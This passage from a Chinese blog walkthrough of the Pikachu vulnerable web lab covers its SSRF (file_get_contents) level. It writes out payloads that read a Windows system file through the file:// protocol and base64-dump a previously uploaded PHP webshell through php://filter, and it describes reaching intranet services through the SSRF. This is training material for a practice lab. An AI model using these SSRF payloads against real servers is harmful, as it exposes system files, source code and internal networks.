+<p><img src="https://img-blog.csdnimg.cn/img_convert/a445eb1571da42a0110bb63638322093.png"></p>
+<p>本关使用了 file_get_contents() 函数，该函数将指定 URL 的文件读入一个字符串并返回。</p>
+<p><strong>file_get_contents 与 curl 的区别：</strong></p>
+<ul>
+<li><p>curl 支持更多协议，有 http、https、ftp、gopher、telnet、dict、file、ldap；模拟 Cookie 登录，爬取网页；FTP 上传下载。</p>
+</li>
+<li><p>fopen &#x2F; file_get_contents 只能使用 GET 方式获取数据。</p>
+</li>
+</ul>
+<p>点击链接后网页会请求一个 url</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/704f14e8a43b3534917264416cd71b7b.png"></p>
+<p>直接使用<code>file</code>协议读取系统配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///c:/windows/win.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/723fb39972a8a5de9cf7fc1c4d95141c.png"></p>
+<p>或者使用<code>php://filter/</code>读 php 源代码，这里读取之前 unsafe fileupload 上传的一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=../unsafeupload/uploads/a.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c67f875f1287bcd1700cc5136ad4f2f9.png"></p>
+<p>使用 base64 解码后得到 php 文件的源码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3dd70f7d67a00d1206c5c2a41bd9e14b.png"></p>
+<p>再或者可以使用<code>http</code>协议去请求内网资源，这里可以在本机创建一个 ssrf.txt 文件，并且使用 python 启动 http 服务</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2d44ee714e5c3776aa13f40ff36d4756.png"></p>
+<p>利用 SSRF 漏洞去请求这个文件，即可获得文件中的内容</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fdfc270b5236e95171d4b5c832ab2803.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/04/14/pikachu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86/">http://example.com/2023/04/14/pikachu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/04/13/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Hello World</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 靶场介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-WriteUP"><span class="toc-number">3.</span> <span class="toc-text">0x03 WriteUP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.1.1.</span> <span class="toc-text">基于表单的暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="toc-number">3.1.2.</span> <span class="toc-text">验证码绕过 (on server)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client"><span class="toc-number">3.1.3.</span> <span class="toc-text">验证码绕过 (on client)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token-%E9%98%B2%E7%88%86%E7%A0%B4"><span class="toc-number">3.1.4.</span> <span class="toc-text">token 防爆破?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Cross-Site-Scripting"><span class="toc-number">3.2.</span> <span class="toc-text">XSS (Cross-Site Scripting)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-get"><span class="toc-number">3.2.1.</span> <span class="toc-text">反射型 xss(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7-xss-post"><span class="toc-number">3.2.2.</span> <span class="toc-text">反射性 xss(post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-xss"><span class="toc-number">3.2.3.</span> <span class="toc-text">存储型 xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-%E5%9E%8B-xss"><span class="toc-number">3.2.4.</span> <span class="toc-text">DOM 型 xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-%E5%9E%8B-xss-x"><span class="toc-number">3.2.5.</span> <span class="toc-text">DOM 型 xss-x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">3.2.6.</span> <span class="toc-text">xss 之盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.7.</span> <span class="toc-text">xss 之过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E4%B9%8B-htmlspecialchars"><span class="toc-number">3.2.8.</span> <span class="toc-text">xss 之 htmlspecialchars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E4%B9%8B-href-%E8%BE%93%E5%87%BA"><span class="toc-number">3.2.9.</span> <span class="toc-text">xss 之 href 输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-%E4%B9%8B-js-%E8%BE%93%E5%87%BA"><span class="toc-number">3.2.10.</span> <span class="toc-text">xss 之 js 输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">3.3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-get"><span class="toc-number">3.3.1.</span> <span class="toc-text">CSRF(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-post"><span class="toc-number">3.3.2.</span> <span class="toc-text">CSRF(post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">3.3.3.</span> <span class="toc-text">CSRF Token</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Inject"><span class="toc-number">3.4.</span> <span class="toc-text">SQL-Inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.3.</span> <span class="toc-text">搜索型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert-x2F-update-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.4.</span> <span class="toc-text">insert&#x2F;update 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.5.</span> <span class="toc-text">delete 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-header-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.6.</span> <span class="toc-text">http header 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-base-on-boolian"><span class="toc-number">3.4.7.</span> <span class="toc-text">盲注 (base on boolian)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8-base-on-time"><span class="toc-number">3.4.8.</span> <span class="toc-text">盲注 (base on time)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-wide-byte-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.9.</span> <span class="toc-text">宽字节注入 (wide byte 注入)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">3.5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="toc-number">3.5.1.</span> <span class="toc-text">exec “ping”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-%E2%80%9Ceval%E2%80%9D"><span class="toc-number">3.5.2.</span> <span class="toc-text">exec “eval”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">3.6.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion-local"><span class="toc-number">3.6.1.</span> <span class="toc-text">File Inclusion(local)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion-remote"><span class="toc-number">3.6.2.</span> <span class="toc-text">File Inclusion(remote)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsafe-Filedownload"><span class="toc-number">3.7.</span> <span class="toc-text">Unsafe Filedownload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsafe-Fileupload"><span class="toc-number">3.8.</span> <span class="toc-text">Unsafe Fileupload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#client-check"><span class="toc-number">3.8.1.</span> <span class="toc-text">client check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME-type"><span class="toc-number">3.8.2.</span> <span class="toc-text">MIME type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getimagesize"><span class="toc-number">3.8.3.</span> <span class="toc-text">getimagesize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Over-Permission"><span class="toc-number">3.9.</span> <span class="toc-text">Over Permission</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">3.9.1.</span> <span class="toc-text">水平越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">3.9.2.</span> <span class="toc-text">垂直越权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%A6-x2F-%E2%80%A6-x2F"><span class="toc-number">3.10.</span> <span class="toc-text">…&#x2F;…&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">3.10.1.</span> <span class="toc-text">目录遍历</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.11.</span> <span class="toc-text">敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IcanseeyourABC"><span class="toc-number">3.11.1.</span> <span class="toc-text">IcanseeyourABC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.12.</span> <span class="toc-text">PHP 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.12.1.</span> <span class="toc-text">PHP 反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">3.13.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.13.1.</span> <span class="toc-text">XXE 漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">3.14.</span> <span class="toc-text">URL 重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84-url-%E8%B7%B3%E8%BD%AC"><span class="toc-number">3.14.1.</span> <span class="toc-text">不安全的 url 跳转</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">3.15.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-curl"><span class="toc-number">3.15.1.</span> <span class="toc-text">SSRF(curl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-file-get-content"><span class="toc-number">3.15.2.</span> <span class="toc-text">SSRF(file_get_content)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/14/pikachu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86/" title="pikachu 靶场渗透记录">pikachu 靶场渗透记录</a><time datetime="2023-04-13T16:58:48.833Z" title="Created 2023-04-14 00:58:48">2023-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/13/hello-world/" title="Hello World">Hello World</a><time datetime="2023-04-13T06:07:21.531Z" title="Created 2023-04-13 14:07:21">2023-04-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
